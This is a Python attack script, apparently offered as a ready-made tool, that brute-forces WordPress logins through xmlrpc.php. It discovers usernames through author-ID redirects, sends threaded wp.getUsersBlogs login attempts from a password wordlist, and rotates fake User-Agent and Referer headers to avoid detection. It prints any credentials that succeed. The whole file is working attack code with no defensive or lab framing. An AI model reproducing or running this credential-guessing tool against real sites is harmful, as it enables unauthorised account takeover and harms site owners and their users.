import requests
import threading
import random
from queue import Queue
import xml.etree.ElementTree as ET

print("\033[1;36m")
print(r"""
__  ____  __ _          ____  ____   ____
\ \/ /  \/  | |        |  _ \|  _ \ / ___|
 \  /| |\/| | |   _____| |_) | |_) | |
 /  \| |  | | |__|_____|  _ <|  __/| |___
/_/\_\_|  |_|_____|    |_| \_\_|    \____|

XML-RPC Brute Forcer - By Sheikh Nightshader
""")
print("\033[0m")

target_url = input("WordPress URL: ").rstrip("/")
if not target_url.endswith("/xmlrpc.php"):
    xmlrpc_url = f"{target_url}/xmlrpc.php"
else:
    xmlrpc_url = target_url

wordlist = input("Path to password wordlist: ")
threads_count = int(input("Number of threads: "))
password_queue = Queue()
stop_event = threading.Event()

fake_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0",
    "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Vivo 1808) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.112 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.19041",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Lenovo TB-8505X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
]

fake_referers = [
    "https://google.com",
    "https://bing.com",
    "https://yahoo.com",
    "https://duckduckgo.com",
]


def find_usernames(url):
    usernames = set()
    for i in range(1, 11):
        try:
            author_url = f"{url}/?author={i}"
            response = requests.get(author_url, timeout=5, allow_redirects=True)
            if response.status_code == 200 and response.url != author_url:
                username = response.url.rstrip("/").split("/")[-1]
                usernames.add(username)
        except Exception:
            continue
    return list(usernames)


def load_passwords():
    try:
        with open(wordlist, "r") as f:
            for line in f:
                password_queue.put(line.strip())
    except FileNotFoundError:
        print("\033[1;31m[-] Error: Wordlist file not found.\033[0m")
        exit()


def parse_response(response_text):
    try:
        root = ET.fromstring(response_text)
        blog = root.find(".//struct/member[name='blogid']/value")
        return blog is not None
    except ET.ParseError:
        return False


def brute_force(username):
    while not password_queue.empty() and not stop_event.is_set():
        password = password_queue.get()
        payload = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
            </params>
        </methodCall>
        """
        headers = {
            'Content-Type': 'application/xml',
            'User-Agent': random.choice(fake_user_agents),
            'Referer': random.choice(fake_referers),
        }
        try:
            response = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=5)
            if response.status_code == 200 and parse_response(response.text):
                print(f"\033[1;32m[+] Success: {username}:{password}\033[0m")
                stop_event.set()  # Stop all threads
                while not password_queue.empty():
                    password_queue.get()
                break
            else:
                print(f"\033[1;31m[-] Failed: {username}:{password}\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {e}\033[0m")
        password_queue.task_done()


usernames = find_usernames(target_url)
if usernames:
    print("\033[1;34mDiscovered usernames:\033[0m")
    for idx, username in enumerate(usernames, start=1):
        print(f"{idx}. {username}")
    try:
        choice = int(input("Select a username (number): "))
        selected_username = usernames[choice - 1]
    except (ValueError, IndexError):
        print("\033[1;31m[-] Invalid choice. Exiting.\033[0m")
        exit()
else:
    selected_username = input("Enter the username manually: ")

load_passwords()
threads = []
for _ in range(threads_count):
    t = threading.Thread(target=brute_force, args=(selected_username,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
